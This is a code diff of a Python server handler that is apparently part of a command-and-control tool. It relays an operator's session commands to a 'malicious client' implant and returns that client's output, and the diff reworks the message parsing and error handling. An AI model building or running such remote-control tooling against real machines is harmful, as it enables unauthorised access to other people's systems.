@@ -513,7 +513,7 @@ class ServerFriendlyClientHandler:
             
             ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
             ## as it's waiting for a response
-            self.client.send_msg_to_maliciousclient("session\\|/session")
+            self.client.send_msg_to_maliciousclient("session")
             
             while True: #self.client.under_control:
                 #logging.debug(f"[Server (session with {self.client.fullname})]")
@@ -523,15 +523,15 @@ class ServerFriendlyClientHandler:
                     print("SESSION LOOP")
                     ## listen for friendly client
                     #a = bytes_decode(self.conn.recv(1024))
-                    a = self.recieve_msg_from_client()
-                    #print(a)
+                    raw_session_message = self.recieve_msg_from_client()
                     
-                    #
-                    session_command, session_command_value = a.split()
+                    ## msg looks like: !_clientcommand_!\\/id\|/command. This is done for server filtering purposes
                     
-                    print(f"A value: {a}")
+                    session_command = raw_session_message.split("\\|/")[2]
                     
-                    if client_command == "break":
+                    print(session_command)
+                                        
+                    if session_command == "break":
                         print("break")
                         #pass
                         #self.client.under_control = False
@@ -539,7 +539,12 @@ class ServerFriendlyClientHandler:
                     else:
                         print("else")
                         ## sending to client
-                        self.client.send_msg_to_maliciousclient(f"{session_command}\\|/{session_command_value}")
+                        #self.client.send_msg_to_maliciousclient(f"{session_command}\\|/{session_command_value}")
+                        
+                        ## just sending it over, the client can do the parsing for session stuff. 
+                        ## client names aren't needed for sessions, or just include it automatically...
+                        
+                        self.client.send_msg_to_maliciousclient(session_command)
                         ##listening back for response
                         results = self.client.recieve_msg_from_maliciousclient()
                         self.send_msg_to_friendlyclient(results)
@@ -627,7 +632,13 @@ class ServerFriendlyClientHandler:
         print("HEADER:" + header_msg_length)
         
         ## getting the amount of chunks/iterations eneded at 1024 bytes a message
-        chunks = math.ceil(int(header_msg_length)/BUFFER)
+        try:
+            chunks = math.ceil(int(header_msg_length)/BUFFER)
+        except ValueError as ve:
+            logging.debug(f"[Server (recieve_msg_from_client)] Error calculating chunk size: {ve}")
+        
+        except Exception as e:
+            logging.debug(f"[Server (recieve_msg_from_client)] Unkown Error: {e}")
         
         complete_msg = "" #bytes_decode(msg)[10:]
         
